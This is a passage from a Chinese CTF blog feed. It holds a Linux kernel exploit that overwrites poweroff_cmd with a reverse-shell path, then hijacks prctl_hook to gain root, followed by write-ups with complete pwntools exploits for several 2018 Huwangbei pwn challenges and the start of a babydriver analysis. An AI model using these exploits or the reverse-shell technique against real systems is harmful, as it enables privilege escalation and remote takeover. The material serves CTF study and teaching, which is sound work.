0;i&lt;((len/8)*8);i+=8)&#123; printf("0x%lx",*(size_t *)(buf+i) ); if (i%16) printf(" "); else printf("\n"); &#125;&#125;void show_vdso_userspace(int len)&#123; size_t addr=0; addr = getauxval(AT_SYSINFO_EHDR); if(addr&lt;0)&#123; puts("[-]cannot get vdso addr"); return ; &#125; for(int i = len;i&lt;0x1000;i++)&#123; printf("%x ",*(char *)(addr+i)); &#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123; size_t addr=0; addr = getauxval(AT_SYSINFO_EHDR); printf("vdso:%lx\n", addr); if(addr&lt;0)&#123; puts("[-]cannot get vdso addr"); return 0; &#125; if (memmem((char *)addr,0x1000,shellcode,strlen(shellcode) ))&#123; return 1; &#125; return 0;&#125;int main()&#123; int fd = -1; size_t result = 0; struct alloc_channel_args alloc_args; struct shrink_channel_args shrink_args; struct seek_channel_args seek_args; struct read_channel_args read_args; struct close_channel_args close_args; struct write_channel_args write_args; size_t addr = 0xffffffff80000000; size_t real_cred = 0; size_t cred = 0; size_t target_addr ; size_t kernel_base = 0 ; size_t selinux_disable_addr= 0x351c80; size_t prctl_hook = 0xeb7df8; size_t order_cmd = 0xe4dfa0; size_t poweroff_work_func_addr =0xa39c0; int root_cred[12]; setvbuf(stdout, 0LL, 2, 0LL); char *buf = malloc(0x1000); char target[16]; strcpy(target,"try2findmep4nda"); fd = open("/dev/csaw",O_RDWR); if(fd &lt; 0)&#123; puts("[-] open error"); exit(-1); &#125; alloc_args.buf_size = 0x100; alloc_args.id = -1; ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args); if (alloc_args.id == -1)&#123; puts("[-] alloc_channel error"); exit(-1); &#125; printf("[+] now we get a channel %d\n",alloc_args.id); shrink_args.id = alloc_args.id; shrink_args.size = 0x100+1; ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args); puts("[+] we can read and write any momery"); for(;addr&lt;0xffffffffffffefff;addr+=0x1000)&#123; seek_args.id = alloc_args.id; seek_args.index = addr-0x10 ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); read_args.id = alloc_args.id; read_args.buf = buf; read_args.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args); if(( !strcmp("gettimeofday",buf+0x2cd)) )&#123; // ((*(size_t *)(buf) == 0x00010102464c457f)) &amp;&amp; result = addr; printf("[+] found vdso %lx\n",result); break; &#125; &#125; if(result == 0)&#123; puts("not found , try again "); exit(-1); &#125; kernel_base = addr&amp;0xffffffffff000000; selinux_disable_addr+= kernel_base; prctl_hook += kernel_base; order_cmd += kernel_base; poweroff_work_func_addr += kernel_base; //size_t argv_0 = kernel_base + 0x117ed20; //size_t mce_do_trigger_addr = kernel_base + 0x0422ba; //size_t env = kernel_base + 0xe4df20; printf("[+] found kernel base: %lx\n",kernel_base); printf("[+] found prctl_hook: %lx\n",prctl_hook); printf("[+] found order_cmd : %lx\n",order_cmd); printf("[+] found selinux_disable_addr : %lx\n",selinux_disable_addr); printf("[+] found poweroff_work_func_addr: %lx\n",poweroff_work_func_addr);// change *poweroff_cmd - &gt; "/reverse_shll\0" memset(buf,'\0',0x1000); //*(size_t *)buf = selinux_disable_addr; strcpy(buf,"/reverse_shell\0"); //strcpy(buf,"/bin/chmod 777 /flag\0"); seek_args.id = alloc_args.id; seek_args.index = order_cmd-0x10 ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); write_args.id = alloc_args.id; write_args.buf = buf;//&amp;cat_flag; write_args.count = strlen(buf); ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args); memset(buf,'\0',0x1000); seek_args.id = alloc_args.id; seek_args.index = order_cmd+14-0x10 ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); write_args.id = alloc_args.id; write_args.buf = buf;//&amp;cat_flag; write_args.count = 1; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);/* memset(buf,'\0',0x1000); *(size_t *)buf = 1 ; //strcpy(buf,"/bin//sh\0"); seek_args.id = alloc_args.id; seek_args.index = kernel_base + 0x1380118-0x10 ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); write_args.id = alloc_args.id; write_args.buf = buf;//&amp;cat_flag; write_args.count = 20+1; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args); */ // change *prctl_hook -&gt; reboot_work_func_addr memset(buf,'\0',0x1000); *(size_t *)buf = poweroff_work_func_addr; seek_args.id = alloc_args.id; seek_args.index = prctl_hook-0x10 ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); write_args.id = alloc_args.id; write_args.buf = buf;//&amp;cat_flag; write_args.count = 20+1; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args); // trag and get reverse shell if(fork() == 0 )&#123; prctl(addr,2, addr,addr,2); exit(-1); &#125; system("nc -l -p 2333"); return 0;&#125; 最终可以拿到root权限的反弹shell 1234567891011 $ ./pwn[+] now we get a channel 1[+] we can read and write any momery[+] found vdso ffffffff81e04000[+] found kernel base: ffffffff81000000[+] found prctl_hook: ffffffff81eb7df8[+] found order_cmd : ffffffff81e4dfa0[+] found selinux_disable_addr : ffffffff81351c80[+] found poweroff_work_func_addr: ffffffff810a39c0iduid=0(root) gid=0(root) 最后感谢simp1e师傅的帮助，学到了很多东西。 参考强网杯出题思路-solid_core: http://simp1e.leanote.com/post/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF-solid_core Bypassing SMEP Using vDSO Overwrites：https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html linux kernel pwn notes: https://xz.aliyun.com/t/2306 idr 机制：http://blog.chinaunix.net/uid-21762157-id-4165782.html https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c 给shellcode找块福地－通过VDSO绕过PXN:https://bbs.pediy.com/thread-220057.htm New Reliable Android Kernel Root Exploitation Techniques： http://t.cn/Rftu7Dn]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[护网杯 CTF 2018线上预选赛PWN题解]]></title>
    <url>%2F2018%2F10%2F14%2Fhwb-ctf-2018%2F</url>
    <content type="text"><![CDATA[照例先放图： gettingstart签到题 12345from pwn import *p = remote('117.78.40.144', 32671)#p = process('task_gettingStart_ktQeERc')p.send('a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A))p.interactive() shoppingcart题目及漏洞分析题目包含了两个结构体，money和good 123456789101100000000 money struc ; (sizeof=0x10, mappedto_6)00000000 name dq ?00000008 sum dq ?00000010 money ends0000001000000000 ; ---------------------------------------------------------------------------0000000000000000 good_chunk struc ; (sizeof=0x10, mappedto_7)00000000 mem_ptr dq ?00000008 sum dq ?00000010 good_chunk ends 其中区别是money的name指向bss段，而good指向堆空间，二者的结构体都是通过malloc(0x10)得到的。 而在这个程序的bss段上，关于money_name、money_list、good_list的排布如下： 123456789.bss:0000000000202090 bss_good_num dq ? ; DATA XREF: add+17↑r.bss:0000000000202090 ; add+E1↑r ....bss:0000000000202098 bss_num dq ? ; DATA XREF: getmoney+8↑r.bss:00000000002020A0 ; char bss_name[160].bss:00000000002020A0 bss_name db 0A0h dup(?) ; DATA XREF: getmoney+62↑o.bss:0000000000202140 bss_list dd ? ; DATA XREF: .bss:00000000002021E0 ; void **bss_good_list[20].bss:00000000002021E0 bss_good_list dq 14h dup(?) ; DATA XREF: add+FB↑o.bss:00000000002021E0 ; free_chunk+24↑o ... 题目提供了对money的add功能。对good的add、edit、free功能。 而漏洞在于edit函数中，其中缺少对修改偏移的check，这个位置存在整数溢出漏洞。当可以找到一个位置满足题目中定义的这种链式结构就可以达到任意内存写。 并且可以注意到此处写0时存在一个null-off-by-one。 123456789101112131415unsigned __int64 edit()&#123; unsigned __int64 v0; // rax __int64 v1; // ST00_8 char s; // [rsp+10h] [rbp-20h] unsigned __int64 v4; // [rsp+28h] [rbp-8h] v4 = __readfsqword(0x28u); puts("Which goods you need to modify?"); fgets(&amp;s, 0x18, stdin); v0 = strtoul(&amp;s, 0LL, 0); printf("OK, what would you like to modify %s to?\n", *bss_good_list[v0], v0); *((_BYTE *)*bss_good_list[v1] + read(0, *bss_good_list[v1], 8uLL)) = 0; return __readfsqword(0x28u) ^ v4;&#125; 另外，在add()函数中，当malloc(0)时，会返回一个0x20的块，并且向mem_ptr-1的位置，即size写入\0，而不影响堆块内存中原有的数据。这样当malloc(0)的堆块是从unsorted bin中分出来的，就存在脏数据来泄露libc地址。 12345678910111213141516171819202122232425262728unsigned __int64 add()&#123; unsigned __int64 size; // ST10_8 good_chunk *good_ptr; // ST18_8 __int64 v2; // rax char s; // [rsp+20h] [rbp-20h] unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); if ( (unsigned __int64)bss_good_num &lt;= 0x13 ) &#123; puts("How long is your goods name?"); fgets(&amp;s, 24, stdin); size = strtoul(&amp;s, 0LL, 0); good_ptr = (good_chunk *)malloc(0x10uLL); good_ptr-&gt;sum = 999LL; good_ptr-&gt;mem_ptr = (__int64)malloc(size); puts("What is your goods name?"); *(_BYTE *)((signed int)read(0, (void *)good_ptr-&gt;mem_ptr, size) - 1LL + good_ptr-&gt;mem_ptr) = 0; v2 = bss_good_num++; bss_good_list[v2] = (void **)good_ptr; &#125; else &#123; puts("Your shopping cart is full now!"); &#125; return __readfsqword(0x28u) ^ v5;&#125; 漏洞利用我想我这种利用方法大概是一种非预期（？），虽然很复杂。。 首先，将money填满（共20个），这样money_name和money_list两块就会相连，然后编辑最后一个money，会导致一位溢出，使得第一个money_list最低位被赋值为0，即堆空间指向低地址。 未覆盖前如下图： 覆盖后如下图： 而这块内存指向哪里呢？ 指向一个大小为0x1010的内存块里，这个内存块是什么呢？ 由于题目中没有setvbuf，又用了fgets，这个内存块是stdin的缓冲区 如果对IO知识有一定了解就会知道，fgets并不是安装其参数的大小调用read函数，具体可以参考https://www.anquanke.com/post/id/86945 因此，如果我们在fgets时输入超长的字符串的话，不但可以控制程序执行流，还可以将moneylist所指向的内存置为\_free_hook，这样就可以将其劫持为system，在释放时可以触发system(“/bin/sh”)。 远程时，这个堆块并不是0x1010，调试这个大小花了很多功夫….所以我想应该算是一种非预期解法吧。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103from pwn import *import timedebug=1lib = 0if lib==0: libc_name = '/lib/x86_64-linux-gnu/libc.so.6' offset = 0x230 one_gadget = [0x45216,0x4526a,0xf0274,0xf1117]else: libc_name = '/lib/x86_64-linux-gnu/libc.so.6' offset = 0x260 one_gadget = [0x45216,0x4526a,0xef6c4,0xf0567]context.log_level = 'debug'elf = ELF('./task_shoppingCart')if debug: p= process('./task_shoppingCart')#,env=&#123;'LD_PRELOAD' :libc_name&#125;) libc = ELF(libc_name)else: p = remote( '117.78.26.133', 31666)#process('./pwn1') libc = ELF(libc_name) offset = 0x230def add(size,name): p.recvuntil("Now, buy buy buy!") p.sendline('1') p.recvuntil("name?") p.sendline(str(size)) p.recvuntil("What is your goods name?") p.send(name)def delete(idx): p.recvuntil("Now, buy buy buy!") p.sendline('2') p.recvuntil("Which goods that you don't need?") p.sendline(str(idx) )def edit(idx): p.recvuntil("Now, buy buy buy!") p.sendline('3') p.recvuntil("Which goods you need to modify?") p.sendline(str(idx))def edit_vul(context): p.recvuntil("Now, buy buy buy!") p.sendline('3') p.recvuntil("Which goods you need to modify?") p.send(context)if debug: attach(p)for i in range(0x13): p.recvuntil("EMMmmm, you will be a rich man!") p.sendline('1') p.recvuntil("I will give you $9999, but what's the currency type you want, RMB or Dollar?") p.sendline('a'*8)p.recvuntil("EMMmmm, you will be a rich man!")p.sendline('1')p.recvuntil("I will give you $9999, but what's the currency type you want, RMB or Dollar?")p.sendline('b'*8) p.recvuntil("EMMmmm, you will be a rich man!")p.sendline('3')raw_input()add(0x100,'p4nda') #0add(0x70,'/bin/sh\0') #1delete(0)add(0,'')#2edit(2)p.recvuntil('OK, what would you like to modify ')libc_addr = u64(p.recv(6).ljust(8,'\0'))libc.address = libc_addr- 0x10 - 344 -libc.symbols['__malloc_hook'] p.send('p4nda')print '[+] leak',hex(libc_addr) print '[+] system',hex(libc.symbols['system']) edit( (0x202140+19*8 - 0x2021E0 )/8 &amp;0xffffffffffffffff )p.recvuntil('to?')p.send('d'*8)raw_input()payload = (str((0x202140 - 0x2021E0 )/8 &amp;0xffffffffffffffff)+'\n') payload+= (str(2)+'\n') payload+= (str(1)+'\n')if debug: payload = payload.ljust(0x1000-0x20,'a') payload+= p64(libc.symbols['__free_hook'])else: payload = payload.ljust(0x100,'a') payload+= p64(libc.symbols['__free_hook']) * 0x60edit_vul(payload)p.recvuntil('to?')p.send(p64(libc.symbols['system']))p.interactive() huwang此题不是我做出的，贴一个w1tcher的EXP吧 EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *context(arch = 'amd64', os = 'linux', endian = 'little')context.log_level = 'debug'context.terminal = ['tmux', 'split', '-h']def sixsixsix(p, name, rd, secret, flag = 1): p.recvuntil('&gt;&gt; \n') p.sendline('666') p.recvuntil('name\n') p.send(name) p.recvuntil('secret?\n') p.sendline('y') p.recvuntil('secret:\n') p.sendline(str(rd)) if flag == 1: p.recvuntil('secret\n') p.send(secret)def GameStart(ip, port, debug): if debug == 1: p = process('./huwang') else: p = remote(ip, port) sixsixsix(p, 'w1tcher', -1, 'w1tcher', 0) p.recvuntil('timeout~') if debug == 1: p = process('./huwang', env = &#123;'LD_PRELOAD' : './libc.so.6'&#125;) gdb.attach(p, 'b *0x040110D\nc') else: p = remote(ip, port) libc = ELF('./libc.so.6') sixsixsix(p, 'w1tcher'.ljust(0x19, 'a'), 1, '4ae71336e44bf9bf79d2752e234818a5'.decode('hex')) p.recvuntil('w1tcher'.ljust(0x19, 'a')) canary = u64('\x00' + p.recvn(7)) p.recvuntil('occupation?\n') p.send('a' * 0xff) p.recvuntil('[Y/N]\n') p.sendline('Y') shellcode = 'a' * 0x108 + p64(canary) + p64(0) shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C) p.send(shellcode) p.recvuntil('Congratulations, ') libc_addr = u64(p.recvn(6) + '\x00' * 2) - libc.symbols['puts'] p.recvuntil('occupation?\n') p.send('a' * 0xff) p.recvuntil('[Y/N]\n') p.sendline('Y') shellcode = 'a' * 0x108 + p64(canary) + p64(0) shellcode += p64(0x0000000000401573) + p64(next(libc.search('/bin/sh')) + libc_addr) + p64(libc_addr + libc.symbols['system']) p.send(shellcode) p.interactive()if __name__ == '__main__': GameStart('117.78.26.79', 31399, 1) six此题恰好之前在看雪论坛上见到过类似的，并且还讨论并且复现了一下，所以就直接用之前的EXP打了，拿了2血。手速还是慢了，不知道是不是和我讨论的师傅拿了一血。 题目分析题目就是一个6字节的shellcode。 其中，程序申请了两块0x1000的内存，分别用作栈和代码段： 12345fd = open("/dev/urandom", 0);read(fd, &amp;buf, 6uLL);read(fd, &amp;v3, 6uLL);dest = mmap((void *)(v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL);qword_202098 = (__int64)mmap((void *)(buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 1280; 可以看到生成的方法是用/dev/urandom的随机数，第一次在看雪上看到这个生成方法时觉得二者是不可能连在一起的，但是当这两个地址冲突或者不符合条件时，mmap会随机分配这个地址，而当二者均随机分配时，则这两个地址是相连的。这个前提解决了很多问题，节省了很多指令。 而在执行shellcode时，预先将除rsp、rip其他寄存器全部置零了， 12345678910111213141516=&gt; 0x7f90763a4000: mov rsp,rdi 0x7f90763a4003: xor rbp,rbp 0x7f90763a4006: xor rax,rax 0x7f90763a4009: xor rbx,rbx 0x7f90763a400c: xor rcx,rcx 0x7f90763a400f: xor rdx,rdx 0x7f90763a4012: xor rdi,rdi 0x7f90763a4015: xor rsi,rsi 0x7f90763a4018: xor r8,r8 0x7f90763a401b: xor r9,r9 0x7f90763a401e: xor r10,r10 0x7f90763a4021: xor r11,r11 0x7f90763a4024: xor r12,r12 0x7f90763a4027: xor r13,r13 0x7f90763a402a: xor r14,r14 0x7f90763a402d: xor r15,r15 但当两块内存相连时，如果从rsp进行覆写的话，是可以覆写到代码段的。 因此shellcode如下： 12340x7f90763a4030 push rsp0x7f90763a4031 pop rsi0x7f90763a4032 mov edx, esi0x7f90763a4034 syscall 如此，便可以从栈上向代码段一直写入，直到写入现在的RIP，将后续指令写为shellcraftsh() EXP1234567891011121314151617from pwn import *p =process('./six')#p=remote('117.78.26.97', 32200)#process('./seven')gdb.attach(p)p.readuntil('shellcode:')payload=chr(0x54)+chr(0x5e)+chr(0x8b)+chr(0xd6)+chr(0x0F)+chr(0x05)p.send(payload)z=[0xB8, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xFE, 0x48, 0x81, 0xC7, 0x4e, 0x0B, 0x00, 0x00, 0x4b, 0x48,0x33, 0xD2, 0x48,0x33, 0xF6, 0x0F, 0x05, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00]zz=''for i in range(0,len(z)): zz+=chr(z[i])payload='b'*0xb36+zzp.writeline(payload)p.interactive() calendar此题无论从题目给定的条件和hint都说明是House of Roman。 这个利用方法半年以前被提出，主要思路是解决无法泄露地址时，通过低位地址写+爆破的方法来对抗aslr。可以参考https://xz.aliyun.com/t/2316 题目及漏洞分析题目功能很简单了，提供了add、edit、free三个功能，并且不限制次数，但只提供4个指针位置了。 其中，程序的读取输入函数存在off_by_one漏洞。 1234567891011121314151617181920212223__int64 __fastcall read_n_off_by_one(__int64 a1, signed int a2)&#123; char buf; // [rsp+13h] [rbp-Dh] unsigned int i; // [rsp+14h] [rbp-Ch] unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); for ( i = 0; (signed int)i &lt;= a2; ++i ) &#123; if ( (signed int)read(0, &amp;buf, 1uLL) &lt;= 0 ) &#123; puts("read error"); exit(0); &#125; if ( buf == 10 ) &#123; *(_BYTE *)((signed int)i + a1) = 0; return i; &#125; *(_BYTE *)(a1 + (signed int)i) = buf; &#125; return i;&#125; 而free函数没有置空指针，导致存在UAF漏洞。 漏洞利用知道了漏洞条件后就利用了，对比最初的House of Roman，题目增加了对内存块大小的限制，大小限制在fastbin中，但是并通过off-by-one + free可以构造unsorted bin。 可以看一下原始的House of Roman是如何利用的： 12345678910111. 首先分配 3 个 chunk （A , B, C） ，大小分别为 0x20, 0xd0, 0x702. 在 B + 0x78 处设置 p64(0x61) ， 作用是 fake size ,用于后面 的 fastbin attack释放掉 B , B 进入 unsorted bin , 此时 B+0x10 和 B+0x18 中有 main_arean 的地址再次分配 0xd0 , 会分配到 B， 此时 B+0x10 和 B+0x18 中 main_arean 的地址依然存在然后分配 3 个 0x70 的 chunk (D , E, F)， 为后续做准备3. 在 A 触发 单字节溢出，修改 B-&gt;size = 0x71 . 然后释放 C , D， 此时 C , D 进入 fastbin , 同时 D-&gt;fd = C. 由于 chunk之间的相对偏移固定，于是利用 uaf 修改 D-&gt;fd 的低 字节 ，使得 D-&gt;fd=B4. 此时 B-&gt;size = 0x71 ，同时 B + 0x78 为 p64(0x61) （第2步设置）， 这就成功伪造了一个 0x70 大小的 fastbin。 此时 B-&gt;fd 为 main_arean 的地址，于是通过 修改 低 2个字节，可以修改到 malloc_hook - 0x23 处 （ malloc_hook - 0x23 + 0x8 处的值为 p64(0x7f) )5. 然后分配 3 次 0x70 的 chunk， 就可以拿到包含 malloc_hook 的 chunk, 此时 malloc_hook 内容为 06. 然后利用 unsorted bin 修改 malloc_hook 内容为 main_arean 的地址7. 利用部分写修改 malloc_hook 为 one_gadget8. 多次释放一个指针，触发 double free 异常，进而触发 malloc_printerr ， getshell 总结一下就是： 1231. 通过unsorted bin的分配与释放，再次分配时可以得到main_arena+88这个地址，通过写低字节可以写为__malloc_hook-0x23。2. 释放当初申请的堆块，通过修改堆块第地址的方法，让修改为__malloc_hook-0x23的堆块进入0x70的fastbin链。因而可以通过malloc得到__malloc_hook-0x23这个堆块3. 通过unsorted bin attack让__malloc_hook处置为main_arena+88，再通过写低字节，将其写为one_gadget，从而拿到shell。 可以看到最初的aslr随机为是32比特，爆破概率为1/4294967296，而用此方法可将爆破概率提高为1/2**12 = 1/4096。（由one_gadget与main_arena+88偏移决定） 此题由于没有unsorted bin，所以可以用一字节溢出，再释放的方法得到unsorted bin，如下： 12345678add(0,0x68)add(0,0x68)add(0,0x18)add(1,0x68)add(2,0x68)add(3,0x68)edit(0,0x18,'a'*0x18+'\xe1')remove(1) 当得到这个unsorted bin之后，再将其分配出来。 0 ,3 分别是unsorted bin的两部分，2是用于防止合并。 123add(0,0x68) # first chunk of unsorted bin add(3,0x68) # second chunk of unsorted binadd(2,0x68) 通过对0的低地址写，可以将其fd写为__malloc_hook-0x23。 然后释放3、2两个块，此时fastbin上存在两个块。 123edit(0,1,p64(libc_base+libc.symbols['__malloc_hook']-0x23)[:2] ) remove(3)remove(2) 当对2块低地址写，可以将2块的fd指向0块，此时0块进入fastbin，其fd是__malloc_hook-0x23。并且可将__malloc_hook-0x23申请回来，存在3的位置上。 1234567edit(2,1,'\n')add(2,0x68)add(2,0x68)add(3,0x68) # malloc_hook -0x23 is here#repair fastbinremove(2)edit(2,7,p64(0)) 接下来就可以构造unsorted bin attack了。 首先还是同样的方法得到unsorted bin，由于unsorted bin attack 需要满足一些size的检测，因此提前构造堆结构： 1234567891011add(0,0x68)add(0,0x18)add(1,0x68)add(2,0x68)edit(2,0x67,(p64(0x70)+p64(0x20))*4+(p64(0x20)+p64(0x21))*2+'\n' )add(2,0x68)#add(2,0x68)edit(0,0x18,'a'*0x18+'\xe1')remove(1)add(0,0x18)add(0,0x18) 当前的unsorted bin 大小还是很大，由于限制不能分配出来，因此再次将unsorted bin size改成0x71，并且将bk改为__malloc_hook-0x10。 1234edit(0,0x18,'a'*0x18+'\x71')edit(1,0x49,'a'*0x18+p64(0x21)+'a'*0x18+p64(0x71)+'a'*8+ p64(libc_base+libc.symbols['__malloc_hook']-0x10)[:2] )#raw_input()add(0,0x68) 此时，__malloc_hook被写为main_arena+88，再次通过低字节写的方法，将其改为one_gadget，就可以拿到shell了。 1234edit(3,0x15,'a'*0x13+p64(libc_base+one_gadget[2])[:3])remove(1)remove(1)p.interactive() 剩下的事情就是爆破看RP了。。。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124from pwn import *import timedebug=1lib = 0if lib==0: libc_name = '/lib/x86_64-linux-gnu/libc.so.6' offset = 0x230 one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]else: libc_name = '/lib/x86_64-linux-gnu/libc.so.6' offset = 0x260 one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]context.log_level = 'debug'elf = ELF('./task_calendar')def z(bp = ''): if debug: gdb.attach(p,bp)def get_base(p1): f = open('/proc/'+str(pidof(p1)[0])+'/maps','r') while 1: tmp = f.readline() print tmp #raw_input() if 'libc-2.23.so' in tmp: libc_addr = int('0x'+tmp.split('-')[0],16) #print hex((one_gadget[0]+libc_addr)&amp;0xffffff) #if p64(((one_gadget[3]+libc_addr)&amp;0xffffff))[0:3] == (two_bytes+'\x00'): #if ((one_gadget[0]+libc_addr)&amp;0xffffff)==0x66c4: #print 'a'*1024 ##gdb.attach(p) #f1 = open('./result','w+') #f1.write('1') #f1.close() f.close() break print '[+] libc_addr :',hex(libc_addr) return libc_addrif debug: p= process('./task_calendar' ,env=&#123;'LD_PRELOAD' :libc_name&#125;) #f = open('/proc/'+str(pidof(p)[0])+'/maps','r') libc_base = get_base(p)&amp;0xffffff libc = ELF(libc_name)else: p = remote( '117.78.26.133', 31666)#process('./pwn1') libc = ELF(libc_name) libc_base = 0xf64000 # guess libc_basedef add(index, size): p.recvuntil('choice&gt; ') p.sendline('1') p.recvuntil('choice&gt; ') p.sendline(str(index + 1)) p.recvuntil('size&gt; ') p.sendline(str(size))def edit(index, size, data): p.recvuntil('choice&gt; ') p.sendline('2') p.recvuntil('choice&gt; ') p.sendline(str(index + 1)) p.recvuntil('size&gt; ') p.sendline(str(size)) p.recvuntil('info&gt; ') p.send(data)def remove(index): p.recvuntil('choice&gt; ') p.sendline('3') p.recvuntil('choice&gt; ') p.sendline(str(index + 1))z('c\n')p.recvuntil('input calendar name&gt;')p.sendline('p4nda')add(0,0x68)add(0,0x68)add(0,0x18)add(1,0x68)add(2,0x68)add(3,0x68)edit(0,0x18,'a'*0x18+'\xe1')remove(1)#here we got a unsorted bin whose ptr in chunk1#so, chunk 0,2,3 are uselessadd(0,0x68) # first chunk of unsorted bin add(3,0x68) # second chunk of unsorted binadd(2,0x68)#change the original main_arena+88 to __malloc_hook-0x23edit(0,1,p64(libc_base+libc.symbols['__malloc_hook']-0x23)[:2] ) remove(3)remove(2)#change first fd to fake chunk pointed to __malloc_hook-0x23edit(2,1,'\n')add(2,0x68)add(2,0x68)add(3,0x68) # malloc_hook -0x23 is here#repair fastbinremove(2)edit(2,7,p64(0))# get an unsorted bin chunk firstadd(0,0x68)add(0,0x18)add(1,0x68)add(2,0x68)edit(2,0x67,(p64(0x70)+p64(0x20))*4+(p64(0x20)+p64(0x21))*2+'\n' )add(2,0x68)#add(2,0x68)edit(0,0x18,'a'*0x18+'\xe1')remove(1)add(0,0x18)add(0,0x18)edit(0,0x18,'a'*0x18+'\x71')edit(1,0x49,'a'*0x18+p64(0x21)+'a'*0x18+p64(0x71)+'a'*8+ p64(libc_base+libc.symbols['__malloc_hook']-0x10)[:2] )#raw_input()add(0,0x68)edit(3,0x15,'a'*0x13+p64(libc_base+one_gadget[2])[:3])remove(1)remove(1)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【KERNEL PWN】CISCN 2017 babydriver题解]]></title>
    <url>%2F2018%2F10%2F11%2Fciscn-2017-babydriver%2F</url>
    <content type="text"><![CDATA[题目及相关文件下载，密码：3ryy 题目参考了Anciety的这篇文章里讲述的方法，算是一种对于KERNEL PWN中UAF漏洞通用的提权方法。 本文参看代码linux-4.4.110源码，下载链接：https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.110.tar.gz Babydriver题目&amp;漏洞分析题目实现了babyopen、babyioctl、babyread、babywrite、babyrelease五个函数。 其中在babyopen中初始化了一个64字节的堆内存，并将这个内存地址和大小放在类似于BSS段的全局变量结构中存储。 在babyioctl中存在一个指令0x10001，这个指令可以重新制定堆块大小，将原有的内存释放，重新申请新的堆空间。 在babyread和babywrite中实现了常规的copy_from_user和copy_to_user，把堆块当做缓存，也限制了读取大小最多为babydev_struct.device_buf_len。 最后，在babyrelease中将释放申请的堆块。 该漏洞在于，内核的驱动仅加载一次。因此，驱动的全局变量是共享的，当同时打开多个文件时，babydev_struct.device_buf会被不断覆写，而在babyrelease时，会释放掉全部文件共享的缓冲区。而由于存在设置大小的函数，从而可以造成任意大小堆块的UAF漏洞。 漏洞利用ptmx设备ptmx设备是tty设备的一种，当使用open函数打开时，通过系统调用进入内核，创建新的文件结构体，并执行驱动设备自实现的open函数。 具体open细节可以参考 ： https://blog.csdn.net/liushuimpc/article/details/51610941 调试时，发现ptmx打开的函数调用路径如下： 1234567891011► f 0 ffffffff81507e50 ptmx_open f 1 ffffffff8120acbf chrdev_open+191 f 2 ffffffff81203e1f do_dentry_open+511 f 3 ffffffff812052f4 vfs_open+84 f 4 ffffffff81214587 path_openat+439 f 5 ffffffff81214587 path_openat+439 f 6 ffffffff812168f1 do_filp_open+145 f 7 ffffffff812056ca do_sys_open+314 f 8 ffffffff812057de sys_open+30 f 9 ffffffff812057de sys_open+30 f 10 ffffffff8183d259 entry_SYSCALL_64+137 最终执行了ptmx_open函数，这个函数在\drivers\tty\pty.c 的734行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081static int ptmx_open(struct inode *inode, struct file *filp)&#123; struct pts_fs_info *fsi; struct tty_struct *tty; struct inode *slave_inode; int retval; int index; nonseekable_open(inode, filp); /* We refuse fsnotify events on ptmx, since it's a shared resource */ filp-&gt;f_mode |= FMODE_NONOTIFY; retval = tty_alloc_file(filp); if (retval) return retval; fsi = devpts_get_ref(inode, filp); retval = -ENODEV; if (!fsi) goto out_free_file; /* find a device that is not in use. */ mutex_lock(&amp;devpts_mutex); index = devpts_new_index(fsi); mutex_unlock(&amp;devpts_mutex); retval = index; if (index &lt; 0) goto out_put_ref; mutex_lock(&amp;tty_mutex);--&gt; tty = tty_init_dev(ptm_driver, index); /* The tty returned here is locked so we can safely drop the mutex */ mutex_unlock(&amp;tty_mutex); retval = PTR_ERR(tty); if (IS_ERR(tty)) goto out; /* * From here on out, the tty is "live", and the index and * fsi will be killed/put by the tty_release() */ set_bit(TTY_PTY_LOCK, &amp;tty-&gt;flags); /* LOCK THE SLAVE */ tty-&gt;driver_data = fsi; tty_add_file(tty, filp); slave_inode = devpts_pty_new(fsi, MKDEV(UNIX98_PTY_SLAVE_MAJOR, index), index, tty-&gt;link); if (IS_ERR(slave_inode)) &#123; retval = 